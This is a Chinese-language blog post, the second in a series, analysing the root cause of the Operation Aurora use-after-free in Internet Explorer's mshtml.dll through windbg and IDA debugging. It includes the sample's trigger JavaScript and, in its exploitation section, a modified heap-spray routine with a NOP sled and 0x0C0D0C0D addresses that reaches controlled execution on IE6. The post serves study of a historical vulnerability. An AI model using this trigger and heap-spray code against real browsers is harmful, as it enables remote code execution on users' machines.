# 极光行动漏洞分析-漏洞成因分析


<!--more-->

---

{{< admonition abstract "文章链接" >}}
极光行动漏洞分析 1：[提取样本](/2019/06/aurora-analysis-1/)  
极光行动漏洞分析 2：[漏洞成因分析](/2019/06/aurora-analysis-2/)
{{< /admonition >}}

---

## 1. 前言

[上一篇文章](/2019/06/aurora-analysis-1/)对流量包进行了分析，提取出了攻击样本，这次接着对漏洞成因进行一次详细分析。

---

## 2. 漏洞详细分析

### 2.1 查看崩溃信息

首先访问提取的攻击样本，使`IE`崩溃：
![](/images/极光行动漏洞分析-漏洞成因分析/5e2caaa29cc56907e1bd372e762b6bbd67626acd0967a8ec5dd206fcdd94c84e.png "IE崩溃")

从崩溃信息来看，崩溃位置在`mshtml.dll`模块中偏移`0x68C83`的位置

{{< admonition  >}}
需要注意的是，该漏洞是一个`UAF`漏洞，在空间被释放后，那一片区域的内存空间可以被任意使用的，而堆喷的内容有可能会被程序运行过程中给覆盖掉，所以会导致漏洞利用失败，需要多次尝试
{{< /admonition >}}

### 2.2 windbg查看详情

通过`windbg`附加调试，可以看到是在`CElement::GetDocPtr`这个函数产生了崩溃：
![](/images/极光行动漏洞分析-漏洞成因分析/4894c0f5ebf774464bb848bd9d4a80bb224e5ac2712b3663b95c4809a477448c.png "windbg调试详情")

从上图可以看到，崩溃原因是因为`ECX`的值为`0x00000054`，而从`[ECX]`中取值产生了访问异常，那么`ECX`的值是哪来的呢？

{{< admonition  >}}
在windbg中显示符号需要符号文件支持，在这里的话，如果没有`mshtml.dll`文件的符号文件，是显示不出来函数名称的
{{< /admonition >}}

### 2.3 windbg栈回溯

通过`windbg`进行栈回溯，如下：
![](/images/极光行动漏洞分析-漏洞成因分析/8508a7c4ffb62c40446374dfdb181edcd56d879ca1c593dd7906e592f70b1cac.png "栈回溯")

从栈回溯中，可以看到调用`CElement::GetDocPtr`的位置是`CEventObj::GenericGetElement`函数和`CEventObj::get_srcElement`函数  

### 2.4 ECX寻找

从后往前分析，首先分析`CEventObj::GenericGetElement`。将`mshtml.dll`拖入`IDA Pro`并且定位到`CEventObj::GenericGetElement`函数(**需要符号文件支持**)，找到调用`CElement::GetDocPtr`的位置，如下图：
![](/images/极光行动漏洞分析-漏洞成因分析/792cb73d57548e0ac8f8148260d022ff679147d9c8552c85af4b9bf3040140a5.png "ECX寻找")

从上图可看到，调用`CElement::GetDocPtr`之前，`ECX`的值来自`EBX`，而`EBX`又是从`[ESI]`所指向的内存地址中取出的值，那么`ESI`的值是哪来的呢？

### 2.5 ESI寻找
现在要寻找`ESI`的值是从哪来的。因为`call CElement::GetDocPtr`的位置上面很多地方都可以跳转过来，所以这里需要进行动态调试，我经过多次测试之后，跟踪了跳到这的路径，如下：
![](/images/极光行动漏洞分析-漏洞成因分析/f753601d862a799a32fa3be63ac59d636f1f0990e72e0f5d770795751896a3d9.png "ESI寻找")

总结下来就是这样：
* `EAX` = `[EBP-8]` = `CEventObj::GetParam`函数获取的值
* `ESI` = `[EAX]`
* `ECX` = `EBX` = `[ESI]`

### 2.6 ECX的真相

通过上面的分析，终于搞清了`ECX`的最终来源是`[EBP-8]`。但还是很懵逼，`[EBP-8]`里面到底是什么，需要知道`CEventObj::GetParam`这个函数获取了什么才行。在网上搜索到的关于这个的一些说明，如下：
![](/images/极光行动漏洞分析-漏洞成因分析/b3a4da99a0d866c55d653ce42336b4649f85a1aa8749646e196b6c4e9b41b098.png " ")

也就是说`CEventObj::GetParam`这个函数是获取`EVENTPARAM`这个结构体的指针的，那么上面的总结应该变成这样：
* `EAX` = `[EBP-8]` = `EVENTPARAM`结构体指针
* `ESI` = `[EAX]` = `CTreeNode`类指针
* `ECX` = `EBX` = `[ESI]` = `CImgElement`类指针

用`C++`表示大概是这样的：`ECX = EVENTPARAM.CTreeNode.CImgElement`

### 2.7 样本执行流程

现在知道了`ECX`就是`CImgElement`类指针。而程序崩溃原因是因为`ECX`的值被修改成了一个错误的值，也就是说`CImgElement`类指针是错误的。而`CImgElement`类指针是保存在`CTreeNode`类指针所指向的内存空间中，没猜错的话这个`CImgElement`类指针是`CTreeNode`类对象的一个成员属性。类成员属性被改了，那就得分析分析为何被改了，如下：
![](/images/极光行动漏洞分析-漏洞成因分析/349aab5f612eadaa90457ca95936e4b765ddb441943d609265b943d817dc6887.png " ")

`JavaScript`不是很好，上面的分析也是通过网上资料分析的，分析的比较乱，将就着看吧。主要的执行流程就是：

* 通过`onload事件`执行了一个函数
* 进行堆喷射
* 拷贝了一个事件对象，也就是`span`创建出的对象
* 将`span`创建出的对象给释放了
* 设置了一个定时器，去执行了拷贝对象的`srcElement`函数

最重要的两个函数详细分析如下：

```javascript
function WisgEgTNEfaONekEqaMyAUALLMYW(cpznAZhGdtOhTCNSVGLRdYeEfCAPKMeztpQnoKTGKsjrhhkoxCWPz) {

    // 执行堆喷射
    gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX();
	
    // 拷贝span对象，保存在 lTneQKOeMgwvXaqCPyQAaDDYAkd 变量中，拷贝的内容至少包括了 EVENTPARAM结构体指针
    lTneQKOeMgwvXaqCPyQAaDDYAkd = document.createEventObject(cpznAZhGdtOhTCNSVGLRdYeEfCAPKMeztpQnoKTGKsjrhhkoxCWPz);
	
    // 将span对象给释放掉了，也就是将span对象的CTreeNode类指针指向的内存空间释放了
    document.getElementById("vhQYFCtoDnOzUOuxAflDSzVMIHYhjJojAOCHNZtQdlxSPFUeEthCGdRtiIY").innerHTML = "";
	
    // 设置了一个定时器
    window.setInterval(nayjNuSncnxGnhZDJrEXatSDkpo, 50);
}

// 定时器函数
function nayjNuSncnxGnhZDJrEXatSDkpo() {
	p = "\u0c0f\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d";

    // 循环赋值，目的就是为了覆盖span对象释放后的内存空间
	for (i = 0; i < MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul.length; i++) {
		MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i].data = p;
	}

    // 执行了拷贝变量的srcElement函数，这个函数最终会调用CEventObj::get_srcElement函数、CEventObj::GetParam函数、CElement::GetDocPtr函数，最后形成崩溃
	var t = lTneQKOeMgwvXaqCPyQAaDDYAkd.srcElement;
}
```

### 2.8 验证猜想

上面的函数分析，我是根据网上的资料分析，并进行实验后写的。`CTreeNode`类指针所指向的内存空间被修改的原因是因为这个类被释放了，然后就被其他变量所覆盖了。这里验证一下，观察`CTreeNode`类指针修改的原因是否真的是因为类被释放了：

* 首先修改样本代码：
![](/images/极光行动漏洞分析-漏洞成因分析/62ae61756d30a136811d6cd59f2afaad2a2a43e2597ebaf2df7a823ef7778cd9.png " ")

* 然后在执行`CElement::GetDocPtr`的位置下断点，当断在此的时候`ESI`就是`CTreeNode`类指针：
![](/images/极光行动漏洞分析-漏洞成因分析/86098701d45ebdcdf0b824ec7ebc7be2c26f23faa3cf73603c7de332b4a08946.png " ")

* 然后访问修改前后的样本网页，对比观察`ESI`指向的内存空间：
	* 修改前：
![](/images/极光行动漏洞分析-漏洞成因分析/230ab2f9ed6ce866919a10c10b7167bb0acce652ef83ff2bc085fe23424088c7.png " ")

	* 修改后：  
![](/images/极光行动漏洞分析-漏洞成因分析/b735dd97981ae367add57cb20b6afafc0dcb6218dbbaf9765c2e99393fe7add5.png " ")

通过上面的测试，可以很明显的看出`CTreeNode`类指针的确是在被释放之后才被修改的，也就验证了上面的分析。

### 2.9 漏洞成因
验证了`CTreeNode`类指针修改的原因之后，漏洞成因也就很清楚了。通俗一点就是`new` 了一个对象，然后将指针复制了一份，接着释放了对象，然后使用复制的指针去获取了内容并执行，用`C++`代码表示就是这样：

```c++
class CMyclass {
public:
	int GetNum()
	{
		return m_Num;
	}

private:
	int m_Num = 10;

};


int main()
{
	CMyclass* pObj = new CMyclass();
	std::cout << "pObj.m_Num = " << pObj->GetNum() << std::endl;
	CMyclass* p = pObj;
	
	delete pObj;

        // 使用已释放的指针去调用成员函数
	std::cout << "p.m_Num = " << p->GetNum() << std::endl;

	system("pause");
	return 0;
}
```

### 2.10 引发漏洞的语句
引发漏洞最主要的三条语句：
![](/images/极光行动漏洞分析-漏洞成因分析/79297be2a7030dc93ea210d0ca12879394cea9281bb8d0dcd7ba76696fb770c8.png "引发漏洞的语句")

---

## 3. 漏洞利用

既然都知道漏洞成因了，就可以进行漏洞利用了。这里只针对`IE6.0`利用一下，其他的版本又要去考虑绕过保护机制的一些东西了。

* 首先将堆喷射的代码改一改：

```javascript
function gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX() {
	var mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu('%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090');
	var uafwHGfWUmxkIam = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu("%" + "u" + "0" + "c" + "0" + "d" + "%u" + "0" + "c" + "0" + "d");
	do {
		uafwHGfWUmxkIam += uafwHGfWUmxkIam
	} while (uafwHGfWUmxkIam.length < 0xd0000);
	for (S = 0; S < 150; S++) JsgdlqtHVnnWiFMCpdxJheQbdjITPhdkurJqwIMuMxJnHf[S] = uafwHGfWUmxkIam + mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO;
}
```

* 接着在调用`CElement::GetDocPtr`的位置下`条件断点`：`ECX==0x0C0D0C0D`
![](/images/极光行动漏洞分析-漏洞成因分析/f3b9ad46cc532b8fe136543520532dd1728fba5869e18363244e77048de92bc9.png " ")

* 接着重新运行IE，然后访问修改后的样本文件，断下来时`ECX`已经为`0x0C0D0C0D`：
![](/images/极光行动漏洞分析-漏洞成因分析/84ed55853ff61158ea35125dc6aa9d078df3ab50f06466e17da96ec3aa74b84a.png " ")

* 跟到`CElement::GetDocPtr`去执行，可看到`EAX`被赋值为`0x0D0C0D0C`，而执行的位置为`0x0C0D0C0D`：
![](/images/极光行动漏洞分析-漏洞成因分析/88f393ace3659a665a3e5980fd0f8f011764a5c223c031542e7a04f50865661f.png " ")

* 然后跟进去执行，`Ctrl+B`搜索`90909090`，然后下断，运行，可以看到程序顺利的执行到填充的`90909090`的位置：
![](/images/极光行动漏洞分析-漏洞成因分析/3b9fd1d6aee9ce4c284703d1464ce7bfa78a9ae9fa3e5b282fdc8839401b7da2.png " ")

---

## 4. END

这次漏洞分析就到这里结束了，从最开始的流量分析、提取出样本，再到后面的漏洞成因分析，最后到漏洞的利用，这一套流程算是完整的走了一遍，收获蛮大的。真的感觉发现这个漏洞的大佬是真的吊，就是不知道通过啥方式找到的这种漏洞，这是一个坎啊。这次还是很感谢搞出这个流量题的 [@老刘](#)，还有帮助了我很多的 [@梦轩老哥](https://passport.kanxue.com/user-center-830989.htm)。

由于这是我第一次接触`UAF`漏洞，以及第一次从漏洞的一无所知到最终完成分析的过程，其中难免会有分析错误的地方。如果大佬们发现有什么不对的地方，望[斧正](mailto:hstar10@163.com)！

{{< admonition question >}}
其实还有几个点有疑惑，等有时间再一一分析：

- [ ] 样本代码中有两处类似于堆喷的地方，为啥会有多个？
- [ ] 事件对象详细的执行流程
- [ ] 如何修复与防范
{{< /admonition >}}

<br />

---

{{< admonition abstract "参考链接" >}}
看雪大佬的分析：[https://bbs.pediy.com/thread-105899-1.htm](https://bbs.pediy.com/thread-105899-1.htm)

梦轩老哥的分析：[https://bbs.pediy.com/thread-251672.htm](https://bbs.pediy.com/thread-251672.htm)

Ox9A82大佬的分析：[https://www.cnblogs.com/Ox9A82/p/5837769.html](https://www.cnblogs.com/Ox9A82/p/5837769.html)
{{< /admonition >}}
